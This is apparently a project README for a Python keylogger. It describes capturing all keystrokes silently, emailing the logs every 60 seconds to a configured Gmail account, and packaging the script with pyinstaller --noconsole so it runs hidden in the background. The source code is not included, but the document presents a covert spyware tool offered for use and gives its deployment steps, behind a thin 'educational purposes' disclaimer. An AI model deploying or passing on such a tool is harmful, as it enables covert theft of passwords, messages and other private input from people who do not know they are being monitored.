# 🛡️ Python Keylogger  

A **lightweight keylogger** built in Python using `pynput`. It **logs keystrokes** and **sends logs via email** at regular intervals.  

⚠ **Disclaimer:** This script is for **educational and ethical hacking purposes only**.  
Unauthorized keylogging is illegal. Do not misuse it.  

---

## **🔧 Features**  
✔ Logs all keystrokes **silently**.  
✔ Saves logs locally in `keylog.txt`.  
✔ Sends logs via **email every 60 seconds**.  
✔ Works on **Windows, macOS, and Linux**.  
✔ Can run in the **background** as an executable.  

---

## **🚀 Installation & Setup**  

### **1️⃣ Install Dependencies**  
Run the following command to install required libraries:  
```bash
pip install pynput
```

### **2️⃣ Configure Email Settings**  
Edit `keylogger.py` and replace the email credentials:  
```python
EMAIL = "your_email@gmail.com"
PASSWORD = "your_app_password"
```
💡 **Use Gmail App Passwords for security** → [Guide](https://myaccount.google.com/apppasswords)  

### **3️⃣ Run the Keylogger**  
Execute the script using:  
```bash
python keylogger.py
```

---

## **📜 How It Works**  
- **Listens for keystrokes** and stores them in `keylog.txt`.  
- **Every 60 seconds**, sends the log via email.  
- **Clears the log file** after sending to avoid duplicates.  

---

## **💻 Running as an Executable (Windows/Linux)**  
To run the keylogger **silently in the background**, convert it into an `.exe`:  
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole keylogger.py
```
🔹 The `.exe` file will be created inside the `dist/` folder.  

---

## **📂 Repository Structure**  
```plaintext
/keylogger-python
│── keylogger.py    # Main script
│── README.md       # Project documentation
│── LICENSE         # License file
```

---

## **📜 Legal Disclaimer**  
This script is for **educational and security research purposes only**.  
Misuse of keyloggers is **illegal** in many countries. Use responsibly!  
